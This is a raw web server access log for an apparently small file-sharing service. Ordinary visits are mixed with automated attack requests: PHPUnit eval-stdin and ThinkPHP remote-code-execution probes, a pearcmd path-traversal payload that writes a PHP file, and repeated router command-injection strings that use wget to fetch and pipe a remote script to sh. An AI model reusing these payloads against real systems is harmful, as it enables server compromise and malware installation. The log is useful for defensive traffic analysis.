 2024-08-08 00:41:36:913 | thread_id:139761503500096 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '117.62.107.76', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 00:41:36'}
 2024-08-08 08:36:36:674 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:36'}
 2024-08-08 08:36:37:298 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:37'}
 2024-08-08 08:36:37:897 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:37'}
 2024-08-08 08:36:38:523 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:38'}
 2024-08-08 08:36:38:971 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:38'}
 2024-08-08 08:36:39:540 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:39'}
 2024-08-08 08:36:40:141 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:40'}
 2024-08-08 08:36:40:685 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:40'}
 2024-08-08 08:36:41:266 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:41'}
 2024-08-08 08:36:42:258 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:36:42'}
 2024-08-08 08:36:43:190 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/index.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': 's=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=Hello'}, 'ts': '2024-08-08 08:36:43'}
 2024-08-08 08:36:43:982 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/public/index.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': 's=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=Hello'}, 'ts': '2024-08-08 08:36:43'}
 2024-08-08 08:36:44:710 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/index.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': 'lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd&+config-create+%2F=&%2F%3C%3Fecho%28md5%28%22hi%22%29%29%3B%3F%3E+%2Ftmp%2Findex1.php='}, 'ts': '2024-08-08 08:36:44'}
 2024-08-08 08:36:45:379 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/index.php', 'method': 'GET', 'ip': '111.23.122.227', 'request_data': {'query_params': 'lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Findex1'}, 'ts': '2024-08-08 08:36:45'}
 2024-08-08 08:40:31:230 | thread_id:140665994286912 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/index.php', 'method': 'GET', 'ip': '180.101.244.15', 'request_data': {'query_params': 'lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Findex1'}, 'ts': '2024-08-08 08:40:31'}
 2024-08-08 08:43:27:519 | thread_id:139761503500096 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '59.83.208.105', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:43:27'}
 2024-08-08 08:51:00:155 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'url': '/actuator/gateway/routes', 'method': 'GET', 'ip': '83.97.73.245', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 08:51:00'}
 2024-08-08 09:02:31:973 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0', 'url': '/', 'method': 'GET', 'ip': '184.105.247.194', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 09:02:31'}
 2024-08-08 09:04:52:851 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0', 'url': '/favicon.ico', 'method': 'GET', 'ip': '184.105.247.194', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 09:04:52'}
 2024-08-08 09:05:19:637 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0', 'url': '/geoserver/web/', 'method': 'GET', 'ip': '184.105.247.194', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 09:05:19'}
 2024-08-08 09:10:11:629 | thread_id:140254582679360 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '220.196.160.117', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 09:10:11'}
 2024-08-08 09:29:14:466 | thread_id:139761503500096 thread_name:MainThread | INFO | {'useragent': 'Go-http-client/1.1', 'url': '/cgi-bin/luci/;stok=/locale', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'form=country&operation=write&country=%24%28id%3E%60wget+-O-+http%3A%2F%2F154.216.20.232%2Ft%7Csh%3B%60%29'}, 'ts': '2024-08-08 09:29:14'}
 2024-08-08 09:37:55:386 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; Android 9; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36', 'url': '/_profiler/phpinfo', 'method': 'GET', 'ip': '94.156.68.162', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 09:37:55'}
 2024-08-08 09:45:39:790 | thread_id:140254582679360 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; Android 9; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36', 'url': '/_profiler/phpinfo', 'method': 'GET', 'ip': '220.196.160.75', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 09:45:39'}
 2024-08-08 10:01:34:357 | thread_id:139921104299840 thread_name:MainThread | INFO | {'useragent': 'Custom-AsyncHttpClient', 'url': '/phpunit/Util/PHP/eval-stdin.php', 'method': 'GET', 'ip': '220.196.160.83', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 10:01:34'}
 2024-08-08 10:03:46:845 | thread_id:139761503500096 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'url': '/', 'm 2024-08-08 16:58:15:500 | thread_id:140219684083520 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 16:58:15'}
 2024-08-08 16:58:16:462 | thread_id:140219684083520 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 16:58:16'}
 2024-08-08 18:21:49:593 | thread_id:140694327379776 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/docs', 'method': 'GET', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 18:21:49'}
 2024-08-08 18:21:49:727 | thread_id:140694327379776 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/static/swagger-ui/swagger-ui.css', 'method': 'GET', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 18:21:49'}
 2024-08-08 18:21:49:732 | thread_id:140694327379776 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/static/swagger-ui/swagger-ui-bundle.js', 'method': 'GET', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 18:21:49'}
 2024-08-08 18:21:50:472 | thread_id:140694327379776 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/openapi.json', 'method': 'GET', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 18:21:50'}
 2024-08-08 19:41:39:280 | thread_id:140367746520896 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/share/file/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': '', 'from_data': {'expire_value': '1', 'expire_style': 'day', 'file': UploadFile(filename='url.png', size=298906, headers=Headers({'content-disposition': 'form-data; name="file"; filename="url.png"', 'content-type': 'image/png'}))}}, 'ts': '2024-08-08 19:41:39'}
 2024-08-08 19:44:41:868 | thread_id:139909112379200 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/share/file/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': '', 'from_data': {'file': UploadFile(filename='Hillstone QA Feature Test Specification FR41542 云瞻情报库匹配规则适配.docm', size=659885, headers=Headers({'content-disposition': 'form-data; name="file"; filename="Hillstone QA Feature Test Specification FR41542 äº\x91ç\x9e»æ\x83\x85æ\x8a¥åº\x93å\x8c¹é\x85\x8dè§\x84å\x88\x99é\x80\x82é\x85\x8d.docm"', 'content-type': 'application/vnd.ms-word.document.macroEnabled.12'})), 'expire_value': '1', 'expire_style': 'day'}}, 'ts': '2024-08-08 19:44:41'}
 2024-08-08 19:45:06:573 | thread_id:139909112379200 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/share/file/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': '', 'from_data': {'file': UploadFile(filename='docker.md', size=4366, headers=Headers({'content-disposition': 'form-data; name="file"; filename="docker.md"', 'content-type': 'application/octet-stream'})), 'expire_value': '1', 'expire_style': 'day'}}, 'ts': '2024-08-08 19:45:06'}
 2024-08-08 20:01:54:191 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 20:01:54'}
 2024-08-08 20:01:54:808 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/share/select/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': '', 'json_data': {'code': '37367'}}, 'ts': '2024-08-08 20:01:54'}
 2024-08-08 20:01:54:812 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 20:01:54'}
 2024-08-08 20:02:03:123 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/share/select/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': '', 'json_data': {'code': '70761'}}, 'ts': '2024-08-08 20:02:03'}
 2024-08-08 20:02:19:487 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/share/select/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': '', 'json_data': {'code': '31302'}}, 'ts': '2024-08-08 20:02:19'}
 2024-08-08 20:02:37:178 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '49.93.4.24', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 20:02:37'}
 2024-08-08 20:02:37:420 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36', 'url': '/', 'method': 'POST', 'ip': '49.93.4.24', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 20:02:37'}
 2024-08-08 20:02:50:730 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36', 'url': '/share/file/', 'method': 'POST', 'ip': '49.93.4.24', 'request_data': {'query_params': '', 'from_data': {'file': UploadFile(filename='1723108204924.jpeg', size=19691, headers=Headers({'content-disposition': 'form-data; name="file"; filename="1723108204924.jpeg"', 'content-type': 'image/jpeg'})), 'expire_value': '1', 'expire_style': 'day'}}, 'ts': '2024-08-08 20:02:50'}
 2024-08-08 20:03:04:993 | thread_id:140034423433024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/share/select/', 'method': 'POST', 'ip': '122.193.87.109', 'request_data': {'query_params': '', 'json_data': {'code': '63141'}}, 'ts': '2024-08-08 20:03:04'}
 2024-08-08 21:59:13:889 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '101.251.238.165', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 21:59:13'}
 2024-08-08 22:02:26:056 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 zgrab/0.x', 'url': '/druid/index.html', 'method': 'GET', 'ip': '4.255.98.126', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 22:02:26'}
 2024-08-08 22:23:37:181 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '178.128.238.50', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 22:23:37'}
 2024-08-08 22:28:33:263 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', 'url': '/', 'method': 'GET', 'ip': '185.224.128.43', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 22:28:33'}
 2024-08-08 22:48:43:267 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Go-http-client/1.1', 'url': '/cgi-bin/luci/;stok=/locale', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'form=country&operation=write&country=%24%28id%3E%60wget+-O-+http%3A%2F%2F154.216.20.232%2Ft%7Csh%3B%60%29'}, 'ts': '2024-08-08 22:48:43'}
 2024-08-08 23:07:46:394 | thread_id:140536258598720 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50', 'url': '/.env', 'method': 'GET', 'ip': '170.39.185.230', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 23:07:46'}
 2024-08-08 23:40:02:573 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'url': '/', 'method': 'GET', 'ip': '199.45.154.123', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 23:40:02'}
 2024-08-08 23:40:05:647 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'url': '/favicon.ico', 'method': 'GET', 'ip': '199.45.154.123', 'request_data': {'query_params': ''}, 'ts': '2024-08-08 23:40:05'}
